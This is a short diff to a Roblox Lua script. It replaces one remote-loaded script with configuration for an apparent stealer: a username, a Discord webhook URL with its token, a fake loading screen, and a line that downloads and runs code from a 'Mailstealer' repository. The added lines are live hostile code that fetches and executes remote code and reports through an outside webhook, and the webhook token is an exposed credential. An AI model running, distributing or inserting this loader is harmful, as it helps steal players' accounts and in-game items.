@@ -1,1 +1,4 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Egorikusa/PremiumScripts/main/be5d2fa74b2b50f36c379abb.lua'))()
+Username = "duc12741"
+Webhook = "https://discord.com/api/webhooks/1191613837850460250/6276AdaXF9Scj-w1KroNcEJvQmyS4OwF6ZiRW0UYCSmcIOXSg2DA76i_KKK2CdhmMDdY"
+LoadingScreen = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))()
